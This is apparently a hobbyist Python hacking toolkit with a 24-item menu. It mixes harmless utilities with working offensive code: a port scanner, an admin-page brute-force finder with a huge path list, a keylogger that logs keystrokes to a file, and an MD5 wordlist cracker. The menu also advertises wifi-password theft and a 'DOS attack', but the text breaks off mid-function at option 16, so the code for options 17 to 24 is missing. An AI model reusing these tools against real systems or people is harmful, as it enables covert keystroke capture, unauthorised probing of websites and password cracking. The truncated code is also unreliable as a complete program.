#Alireza-adavi  (my full name)
#(instagram: A_ir5)
#life (IRAN)
import socket       # for number 1,8
import random       # for number 2
import string       # for number 2,24
import pyfiglet     # for number 4
import instaloader  # for number 5
import phonenumbers                   # for number6
from phonenumbers import carrier      # for number6
from phonenumbers import geocoder     # for number6
import wikipedia                      # for number 7
import threading                      # for number 9
from datetime import datetime         # for number 9
from queue import Queue               # for number 9
import os                                               # for number 10,13
import platform                                         # for number 11
import psutil                                           # for number 11
import GPUtil                                           # for number 11       
from tabulate import tabulate                           #for number 11          
from playsound import playsound                         # for number 12
import os.path                                                               #for number 13
import time                                                                  #for number 13
import urllib.request
from os import listdir                                                       #for number 13
from os.path import isfile, join                                             #for number 13
import sys                                                                   #for number start(load)
#import winsound                                                                                     #play sound
from termcolor import colored, cprint                                                               #color text
import requests                                                                                     # for number 14,24
import webbrowser                                                                                   # for number 14
import pynput                                                                                       # for number 15  
from pynput.keyboard import Key, Listener                                                           # for number 15
import hashlib                                                                                      # for number 16
from urllib.request import urlopen                                                                  # for number 17  
import psutil                           #
from tabulate import tabulate           #   
import subprocess                       # for number 21
import urllib.request                   # for number 22
from bs4 import BeautifulSoup           # for number 23
import random                           # for number 24
from random import randint              # for number 24
os.system('cls')
        
############################### START CODEING ################################
def menu():
    print("___________________________")
    print(colored("code by instagram: A_ir5", 'blue'))
    print("___________________________")
    #time.sleep(3 )
    print("Loading... ")
    animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
    
    for i in range(len(animation)):
        time.sleep(0.0)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()
        
    '''def play_sound(frequency=2500, duration=1000):
        winsound.Beep(frequency, duration)
    #voice
    if __name__ == "__main__":
     frequency = 40 #HZ
     duration = 50 #1 second
     #low deep sound
     play_sound(frequency, duration)
     #high pitch sound
     play_sound()'''
    now = datetime.now()
    print(now)
    print("__________________________________")
    print(colored("[1]  get website IP",'green' ))
    print("[2]  make password")
    print(colored("[3]  search by google ",'green' ))
    print("[4]  logo with txt")
    print("[5]  Download instagram profile")
    print(colored("[6]  get info  number phone",'green' ))
    print("[7]  search by wikipedia")
    print("[8]  my IP Address")
    print(colored("[9]  port scan",'green' ))
    print("[10] shutdown pc")
    print("[11] show pc info ")
    print("[12] play mp3")
    print(colored("[13] [admin+robots+map] page-website finder", 'green' ))
    print(colored("[14] keyloger", 'green'))
    print(colored("[15] hash MD5 find password", 'green'))
    print(colored("[16] test strong your pass ", 'green'))
    print(colored("[17] passlist generate ", 'green'))
    print(colored("[18] get info number", 'green'))
    print("[19] Choose a password For social mdia")
    print(colored("[20] NetworkScan", 'green'))
    print(colored("[21] get wifi password", 'green'))
    print(colored("[22] Get webpage contents",'green'))
    print(colored("[23] Extract all the URLs from the webpage",'green'))
    print(colored("[24] DOS attack DATEBASE",'green'))
    print("_____________________________________________")
menu()
print()
#print("_____________________________________________")
option = int (input("$ Enter your option: ==> "))
############################################################################
if option == 1:
    print("______________________________________________________________")
    url = input("Enter the site :==> ")
    print("______________________________________________________________")
    print("IP site is :==>",socket.gethostbyname(url))
##############################################################################
elif option == 2:
    def get_random_password_string(length):
        passeord_characters = string.ascii_letters + string.punctuation
        password = ''.join(random.choice(passeord_characters) for i in range(length))
        print("your password : ",password)
    get_random_password_string(15)
##############################################################################
elif option == 3:
    
    try:
        from googlesearch import search
    except ImportError:
        print("no module named 'google' found")
    print("________________________________________________________")
    query = input("Enter any name or any word :==>")
    print("________________________________________________________")
    for j in search(query, tld="co.in", num=10, stop=20, pause=0):
        print(j)
##############################################################################
elif option == 4:
    print("________________________________________________________")
    word = input("Enter word :==> ")
    word = pyfiglet.figlet_format (word)
    print(word)
##############################################################################
elif option == 5:
    mod = instaloader.Instaloader()
    print("_____________________________")
    a = input("Enter user name :==>")
    mod.download_profile(a,profile_pic_only=True)
##############################################################################
elif option == 6:
    print("___________EX==>(+989330000000)_______________")
    a = input("Enter number :==>")
    phone_number = phonenumbers.parse(a)
    print(geocoder.description_for_number(phone_number, 'en'))
    print(carrier.name_for_number(phone_number,'en'))
##############################################################################
elif  option == 7:
    print("______________________________")
    i = input("Enter word :==> ")
    print("______________________________")
    result = wikipedia.summary(i, sentences = 2)
    print(result)
    print("______________________________________________________________________")
##############################################################################
elif option == 8:
    print("______________________________")
    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    print("Your pc Name is :==> ",host)
    print("Your pc ip is :==>", ip)
    print("____________________________________")
##############################################################################
elif option == 9:
    # a print_lock is what is used to prevent "double" modification of shared variables.
    print_lock = threading.Lock()
    print("_______________________________________")
    host = input("Enter a Website:==> ")
    ip = socket.gethostbyname(host)# Translate a host name to IPv4 address format
    #This is just a nice touch that prints out information on which host we are about to scan
    print("-" * 80)
    print("              Please wait, scanning the host --------> ", ip)
    print("-" * 80)

    ## Check what time the scan started
    t1 = datetime.now()

    ## Using the range function to specify ports (here it will scans all ports between 1 and 1024)
    ## We also put in some error handling for catching errors
    def scan(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #it use for Creates a stream socket
            result = sock.connect_ex((ip, port))
            if result == 0:
                print("\n ((((((((Port %d Is Open)))))))" %(port))
                sock.close()
            else:
                print("\n Port %d Is Close :/ " %(port))
        except:
            pass

    def threader():
        while True:
            worker = q.get()
            scan(worker)
            q.task_done()

    q = Queue()

    for x in range(60):
         t = threading.Thread(target=threader)
         t.daemon = True
         t.start()

    for worker in range(1,100):
        q.put(worker)

    q.join()

    t2 = datetime.now()
    total = t2 - t1
    print('Scanning Completed in: ', total)
##############################################################################
elif option == 10:
    os.system("shutdown /s /t 1")
##############################################################################
elif option == 11:
    def get_size(bytes, suffix="B"):

        factor = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bytes < factor:
                 return f"{bytes:.2f}{unit}{suffix}"
            bytes /= factor


    print("="*40, "System Information", "="*40)
    uname = platform.uname()
    print(f"System: {uname.system}")
    print(f"Node Name: {uname.node}")
    print(f"Release: {uname.release}")
    print(f"Version: {uname.version}")
    print(f"Machine: {uname.machine}")
    print(f"Processor: {uname.processor}")

    # Boot Time
    print("="*40, "Boot Time", "="*40)
    boot_time_timestamp = psutil.boot_time()
    bt = datetime.fromtimestamp(boot_time_timestamp)
    print(f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")

    # let's print CPU information
    print("="*40, "CPU Info", "="*40)
    # number of cores
    print("Physical cores:", psutil.cpu_count(logical=False))
    print("Total cores:", psutil.cpu_count(logical=True))
    # CPU frequencies
    cpufreq = psutil.cpu_freq()
    print(f"Max Frequency: {cpufreq.max:.2f}Mhz")
    print(f"Min Frequency: {cpufreq.min:.2f}Mhz")
    print(f"Current Frequency: {cpufreq.current:.2f}Mhz")
    # CPU usage
    print("CPU Usage Per Core:")
    for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
        print(f"Core {i}: {percentage}%")
    print(f"Total CPU Usage: {psutil.cpu_percent()}%")

    # Memory Information
    print("="*40, "Memory Information", "="*40)
   #    get the memory details
    svmem = psutil.virtual_memory()
    print(f"Total: {get_size(svmem.total)}")
    print(f"Available: {get_size(svmem.available)}")
    print(f"Used: {get_size(svmem.used)}")
    print(f"Percentage: {svmem.percent}%")
    print("="*20, "SWAP", "="*20)
    # get the swap memory details (if exists)
    swap = psutil.swap_memory()
    print(f"Total: {get_size(swap.total)}")
    print(f"Free: {get_size(swap.free)}")
    print(f"Used: {get_size(swap.used)}")
    print(f"Percentage: {swap.percent}%")

    # Disk Information
    print("="*40, "Disk Information", "="*40)
    print("Partitions and Usage:")
    # get all disk partitions
    partitions = psutil.disk_partitions()
    for partition in partitions:
        print(f"=== Device: {partition.device} ===")
        print(f"  Mountpoint: {partition.mountpoint}")
        print(f"  File system type: {partition.fstype}")
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            # this can be catched due to the disk that
            # isn't ready
            continue
        print(f"  Total Size: {get_size(partition_usage.total)}")
        print(f"  Used: {get_size(partition_usage.used)}")
        print(f"  Free: {get_size(partition_usage.free)}")
        print(f"  Percentage: {partition_usage.percent}%")
    # get IO statistics since boot
    disk_io = psutil.disk_io_counters()
    print(f"Total read: {get_size(disk_io.read_bytes)}")
    print(f"Total write: {get_size(disk_io.write_bytes)}")

    # Network information
    print("="*40, "Network Information", "="*40)
    # get all network interfaces (virtual and physical)
    if_addrs = psutil.net_if_addrs()
    for interface_name, interface_addresses in if_addrs.items():
        for address in interface_addresses:
            print(f"=== Interface: {interface_name} ===")
            if str(address.family) == 'AddressFamily.AF_INET':
                print(f"  IP Address: {address.address}")
                print(f"  Netmask: {address.netmask}")
                print(f"  Broadcast IP: {address.broadcast}")
            elif str(address.family) == 'AddressFamily.AF_PACKET':
                print(f"  MAC Address: {address.address}")
                print(f"  Netmask: {address.netmask}")
                print(f"  Broadcast MAC: {address.broadcast}")
    # get IO statistics since boot
    net_io = psutil.net_io_counters()
    print(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}")
    print(f"Total Bytes Received: {get_size(net_io.bytes_recv)}")

    # GPU information
    
    
    print("="*40, "GPU Details", "="*40)
    gpus = GPUtil.getGPUs()
    list_gpus = []
    for gpu in gpus:
         # get the GPU id
         gpu_id = gpu.id
         # name of GPU
         gpu_name = gpu.name
         # get % percentage of GPU usage of that GPU
         gpu_load = f"{gpu.load*100}%"
          # get free memory in MB format
         gpu_free_memory = f"{gpu.memoryFree}MB"
         # get used memory
         gpu_used_memory = f"{gpu.memoryUsed}MB"
         # get total memory
         gpu_total_memory = f"{gpu.memoryTotal}MB"
         # get GPU temperature in Celsius
         gpu_temperature = f"{gpu.temperature} °C"
         gpu_uuid = gpu.uuid
         list_gpus.append((
        gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
        gpu_total_memory, gpu_temperature, gpu_uuid
    ))
    print(tabulate(list_gpus, headers=("id", "name", "load", "free memory", "used memory", "total memory",
                                   "temperature", "uuid")))
##############################################################################
elif option == 12:
    # Input an existing wav filename
    wavFile = input("Enter a wav filename: ")
    # Play the wav file
    playsound(wavFile)    
    # Input an existing mp3 
    print("______________________________________")
    mp3File = input("Enter a mp3 filename: ")
    # Play the mp3 file
    playsound(mp3File)
######################################################################################################

elif option == 13:

    def slowprint(s):
        for c in s + '\n' :
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(10. / 100)
    slowprint("[!] Starting : ")
    time.sleep(5)
    os.system('cls')

    print(" \033[ YOU MUST WRITE PROTOCOLE HTTPS:// or HTTP:// ex: http://www.ex.com/ , ex :https://www.ex.com/ ")
    print("______________________________________________ ")
    url = input("\033[97m enter the website : ")
    print ("start : ")
    print("     ")
    passe = ('login','admin/','administrator/','wp-admin/','login.php','robots.txt','administration/',
    'admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/',
    'bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
    'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp','/login.aspx',
    'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
    'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
    'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
    'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
    'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
    'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
    'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','administration','pages/admin/admin-login.html','admin/admin-login.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
    'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
    'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
    'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
    'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
    'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
    'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
    'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html','memberadmin/','administratorlogin/','adm/',
    'admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
    'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
    'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
    'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
    'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
    'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
    'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
    'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
    'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
    'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
    'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
    'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
    'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php','adm/','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm','admin/account.cfm',
    'admin_area/admin.cfm','admin_area/login.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
    'admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm','admin/home.cfm','admin_area/login.html','admin_area/index.html',
    'admin/controlpanel.cfm','admin.cfm','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
    'admin/cp.cfm','cp.cfm','administrator/index.cfm','administrator/login.cfm','nsw/admin/login.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm',
    'administrator/account.cfm','administrator.cfm','admin_area/admin.html','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm',
    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm',
    'moderator/admin.cfm','account.cfm','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cfm','admincontrol.cfm',
    'admin/adminLogin.html','acceso.cfm','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cfm','adminarea/index.html','adminarea/admin.html',
    'webadmin.cfm','webadmin/index.cfm','webadmin/admin.cfm','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cfm','moderator.html',
    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cfm','account.html','controlpanel.html','admincontrol.html',
    'panel-administracion/login.cfm','wp-login.cfm','adminLogin.cfm','admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm',
    'adminarea/admin.cfm','adminarea/login.cfm','panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm',
    'modelsearch/admin.cfm','admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','usuarios/login.cfm',
    'adm/index.cfm','adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm','adminLogin/','admin_area/','panel-administracion/','instadmin/','login.aspx',
    'memberadmin/','administratorlogin/','adm/','admin/account.aspx','admin/index.aspx','admin/login.aspx','admin/admin.aspx','admin/account.aspx',
    'admin_area/admin.aspx','admin_area/login.aspx','siteadmin/login.aspx','siteadmin/index.aspx','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
    'admin_area/index.aspx','bb-admin/index.aspx','bb-admin/login.aspx','bb-admin/admin.aspx','admin/home.aspx','admin_area/login.html','admin_area/index.html',
    'admin/controlpanel.aspx','admin.aspx','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
    'admin/cp.aspx','cp.aspx','administrator/index.aspx','administrator/login.aspx','nsw/admin/login.aspx','webadmin/login.aspx','admin/admin_login.aspx','admin_login.aspx',
    'administrator/account.aspx','administrator.aspx','admin_area/admin.html','pages/admin/admin-login.aspx','admin/admin-login.aspx','admin-login.aspx',
    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.aspx','modelsearch/login.aspx','moderator.aspx','moderator/login.aspx',
    'moderator/admin.aspx','acceso.aspx','account.aspx','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.aspx','admincontrol.aspx',
    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.aspx','adminarea/index.html','adminarea/admin.html',
    'webadmin.aspx','webadmin/index.aspx','webadmin/admin.aspx','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.aspx','moderator.html',
    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.aspx','account.html','controlpanel.html','admincontrol.html',
    'panel-administracion/login.aspx','wp-login.aspx','adminLogin.aspx','admin/adminLogin.aspx','home.aspx','admin.aspx','adminarea/index.aspx',
    'adminarea/admin.aspx','adminarea/login.aspx','panel-administracion/index.aspx','panel-administracion/admin.aspx','modelsearch/index.aspx',
    'modelsearch/admin.aspx','admincontrol/login.aspx','adm/admloginuser.aspx','admloginuser.aspx','admin2.aspx','admin2/login.aspx','admin2/index.aspx','usuarios/login.aspx',
    'adm/index.aspx','adm.aspx','affiliate.aspx','adm_auth.aspx','memberadmin.aspx','administratorlogin.aspx','memberadmin/','administratorlogin/','adm/','admin/account.js','admin/index.js','admin/login.js','admin/admin.js','admin/account.js',
    'admin_area/admin.js','admin_area/login.js','siteadmin/login.js','siteadmin/index.js','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
    'admin_area/index.js','bb-admin/index.js','bb-admin/login.js','bb-admin/admin.js','admin/home.js','admin_area/login.html','admin_area/index.html',
    'admin/controlpanel.js','admin.js','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
    'admin/cp.js','cp.js','administrator/index.js','administrator/login.js','nsw/admin/login.js','webadmin/login.js','admin/admin_login.js','admin_login.js',
    'administrator/account.js','administrator.js','admin_area/admin.html','pages/admin/admin-login.js','admin/admin-login.js','admin-login.js',
    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.js','modelsearch/login.js','moderator.js','moderator/login.js',
    'moderator/admin.js','account.js','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.js','admincontrol.js',
    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.js','adminarea/index.html','adminarea/admin.html',
    'webadmin.js','webadmin/index.js','acceso.js','webadmin/admin.js','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.js','moderator.html',
    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.js','account.html','controlpanel.html','admincontrol.html',
    'panel-administracion/login.js','wp-login.js','adminLogin.js','admin/adminLogin.js','home.js','admin.js','adminarea/index.js',
    'adminarea/admin.js','adminarea/login.js','panel-administracion/index.js','panel-administracion/admin.js','modelsearch/index.js',
    'modelsearch/admin.js','admincontrol/login.js','adm/admloginuser.js','admloginuser.js','admin2.js','admin2/login.js','admin2/index.js','usuarios/login.js',
    'adm/index.js','adm.js','affiliate.js','adm_auth.js','memberadmin.js','administratorlogin.js','bb-admin/index.cgi','bb-admin/login.cgi','bb-admin/admin.cgi','admin/home.cgi','admin_area/login.html','admin_area/index.html',
    'admin/controlpanel.cgi','admin.cgi','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
    'admin/cp.cgi','cp.cgi','administrator/index.cgi','administrator/login.cgi','nsw/admin/login.cgi','webadmin/login.cgi','admin/admin_login.cgi','admin_login.cgi',
    'administrator/account.cgi','administrator.cgi','admin_area/admin.html','pages/admin/admin-login.cgi','admin/admin-login.cgi','admin-login.cgi',
    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cgi','modelsearch/login.cgi','moderator.cgi','moderator/login.cgi',
    'moderator/admin.cgi','account.cgi','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cgi','admincontrol.cgi',
    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cgi','adminarea/index.html','adminarea/admin.html',
    'webadmin.cgi','webadmin/index.cgi','acceso.cgi','webadmin/admin.cgi','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cgi','moderator.html',
    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cgi','account.html','controlpanel.html','admincontrol.html',
    'panel-administracion/login.cgi','wp-login.cgi','adminLogin.cgi','admin/adminLogin.cgi','home.cgi','admin.cgi','adminarea/index.cgi',
    'adminarea/admin.cgi','adminarea/login.cgi','panel-administracion/index.cgi','panel-administracion/admin.cgi','modelsearch/index.cgi',
    'modelsearch/admin.cgi','admincontrol/login.cgi','adm/admloginuser.cgi','admloginuser.cgi','admin2.cgi','admin2/login.cgi','admin2/index.cgi','usuarios/login.cgi',
    'adm/index.cgi','adm.cgi','affiliate.cgi','adm_auth.cgi','memberadmin.cgi','administratorlogin.cgi','admin_area/admin.brf','admin_area/login.brf','siteadmin/login.brf','siteadmin/index.brf','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
    'admin_area/index.brf','bb-admin/index.brf','bb-admin/login.brf','bb-admin/admin.brf','admin/home.brf','admin_area/login.html','admin_area/index.html',
    'admin/controlpanel.brf','admin.brf','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
    'admin/cp.brf','cp.brf','administrator/index.brf','administrator/login.brf','nsw/admin/login.brf','webadmin/login.brfbrf','admin/admin_login.brf','admin_login.brf',
    'administrator/account.brf','administrator.brf','acceso.brf','admin_area/admin.html','pages/admin/admin-login.brf','admin/admin-login.brf','admin-login.brf',
    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.brf','modelsearch/login.brf','moderator.brf','moderator/login.brf',
    'moderator/admin.brf','account.brf','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.brf','admincontrol.brf',
    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.brf','adminarea/index.html','adminarea/admin.html',
    'webadmin.brf','webadmin/index.brf','webadmin/admin.brf','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.brf','moderator.html',
    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.brf','account.html','controlpanel.html','admincontrol.html',
    'panel-administracion/login.brf','wp-login.brf','adminLogin.brf','admin/adminLogin.brf','home.brf','admin.brf','adminarea/index.brf',
    'adminarea/admin.brf','adminarea/login.brf','panel-administracion/index.brf','panel-administracion/admin.brf','modelsearch/index.brf',
    'modelsearch/admin.brf','admincontrol/login.brf','adm/admloginuser.brf','admloginuser.brf','admin2.brf','admin2/login.brf','admin2/index.brf','usuarios/login.brf',
    'adm/index.brf','adm.brf','affiliate.brf','adm_auth.brf','memberadmin.brf','administratorlogin.brf','cpanel','cpanel.php','cpanel.html',)
    for hani in passe :
        curl = url+hani
        try :
            openurl = urllib.request.urlopen(curl)
            print("_____________________________________________________________")
            print("                                                             ")
            print("\033[92m :::: ALERTE::: ADMIN PAGE ITS FOUND ::: "+curl)
            print("_____________________________________________________________")
        except urllib.error.URLError as msg :
            print ("\033[91m **** SORRY NOT FOUND ::: "+curl)


    print ("----------------------------------------------------------------------------------------")
    print ("\033[93m     i HOPE I HAVE HELPED YOU ^_^ , TY FOR USE MY SCRIPT ")
    print ("----------------------------------------------------------------------------------------")
######################################################################################################
#intext:"989334000729" OR intext:"+989334000029" OR intext:"09334000029" OR intext:"0933 000 7729"
#docker run -it -p 8080:8080 sundowndev/phoneinfoga serve -p 8080
######################################################################################################
elif option == 14:
    count = 0
    keys = []

    def press(key):
        global keys, count
        keys.append(key)
        count += 1
        print(key)
        if count >= 10:
            count = 0
            save(keys)
            keys = []

    def save(keys):
        with open("save.txt", "a") as file:
            for key in keys:
                _key = str(key).replace("'","")
                if _key.find("space") > 0:
                    file.write("\n")
                elif _key.find("key") == -1:
                    file.write(_key)

    def release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=press, on_release=release) as listener:
        listener.join()
######################################################################################################
elif option == 15:
    flag = 0
    print("___________________________________________________________")
    pass_hash = input("MD5 hash: ==> ")
    print("___________________________________________________________")
    wordlist = input("File name: ==> ")
    try:
        pass_file = open(wordlist,"r")
    except:
        print("no file found :( ")
        quit()
    for word in pass_file:
        enc_wrd = word.encode('utf-8')
        digest = hashlib.md5(enc_wrd.strip()).hexdigest()
        if digest.strip() == pass_hash.strip():
            print("password found")
            print("password is " + word)
            flag = 1
            break
    if flag == 0:
        print("password not in list plz try more list :) have good hacking :) ")
######################################################################################################
elif option == 16:
    def readwordlist(url):
        try:
            wordlistfile = urlopen(url).read()
        except Exception as e:
            print("Hey there was some error while reading the wordlist, error:", e)
            exit()
        return wordlistfile
    def hash(wordlistpassword):
        result = hashlib.sha1(wordlistpassword.encode())
        return result.hexdigest()
